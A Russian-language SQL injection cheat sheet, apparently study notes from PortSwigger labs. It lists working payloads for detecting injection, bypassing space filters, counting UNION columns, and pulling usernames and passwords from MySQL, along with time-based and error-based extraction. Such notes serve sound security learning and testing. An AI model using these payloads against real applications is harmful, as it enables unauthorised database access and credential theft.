# SQLi — шпаргалка

Заметки по лабам PortSwigger и своим стендам. Сначала разбираюсь, как ввод влияет на SQL-запрос, затем перехожу к извлечению данных.

## С чего начать

```
'            <- кавычка, смотрим ошибку
'-- -        <- если ответ нормальный — инъекция есть, хвост запроса в комментарии
' OR '1'='1   <- классика для обхода фильтров
```

Если фильтр удаляет пробелы, проверить `/**/`, перевод строки `%0a`, табуляцию.

## Комментарии по СУБД

| СУБД | Комментарий |
|---|---|
| MySQL | `#`, `-- ` (пробел обязателен), `/*...*/` |
| PostgreSQL | `--`, `/*...*/` |
| Oracle | `--`, `/*...*/` |
| MSSQL | `--`, `/*...*/` |

## UNION: число столбцов

```
' ORDER BY 3-- -        <- растим цифру, пока не упадёт
' UNION SELECT NULL,NULL-- -
```

Совместимость типов проверяем по ошибкам приведения: меняем NULL на 'a' по одному столбцу.

## Извлечение данных (MySQL)

```sql
' UNION SELECT NULL,version()-- -
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT NULL,concat(username,0x3a,password) FROM users-- -
```

`0x3a` — двоеточие в шестнадцатеричной записи; не требует кавычек.

## Слепая: time-based

```
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
```

Дальше данные восстанавливаются посимвольно по задержке ответа. Даже с `--level 3` sqlmap может не распознать инъекцию; результат автоматической проверки не окончательный.

## Error-based (MySQL)

```sql
' AND extractvalue(1,concat(0x7e,version()))-- -
' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)),1)-- -
```

Извлечение данных через ошибки возможно, если приложение возвращает сообщения СУБД. Это error-based SQLi, а не слепая инъекция; доступность функций зависит от версии MySQL.

## Нюансы, на которых спотыкался

- В некоторых лабах фильтр удалял пробелы — помог `/**/` между ключевыми словами.
- Ошибка БД может быть в теле ответа, но не отображаться на странице. Проверять ответ в Burp, а не только страницу в браузере.
- `UNION` требует одинакового числа столбцов и совместимых типов в соответствующих позициях. Если приложение скрывает ошибки СУБД, несовместимость легко принять за отсутствие инъекции.
